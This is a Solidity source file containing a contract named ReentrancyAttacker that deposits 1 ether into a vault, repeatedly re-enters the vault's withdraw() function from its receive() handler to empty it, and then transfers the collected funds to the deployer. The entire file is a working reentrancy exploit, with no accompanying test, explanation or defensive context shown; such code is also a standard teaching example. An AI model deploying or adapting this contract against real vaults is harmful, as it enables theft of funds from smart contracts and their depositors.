// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @title ReentrancyAttacker — re-enters vault.withdraw() from inside receive()
contract ReentrancyAttacker {
    IVulnerableVault public immutable vault;
    address public immutable attacker;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address vault_) {
        vault = IVulnerableVault(vault_);
        attacker = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "send 1 ether");
        vault.deposit{value: ATTACK_AMOUNT}();
        vault.withdraw();
    }

    receive() external payable {
        // While the vault still holds ETH, keep recursing in to drain more
        if (address(vault).balance >= ATTACK_AMOUNT) {
            vault.withdraw();
        }
    }

    function drain() external {
        require(msg.sender == attacker, "not attacker");
        (bool ok,) = payable(attacker).call{value: address(this).balance}("");
        require(ok, "drain failed");
    }
}
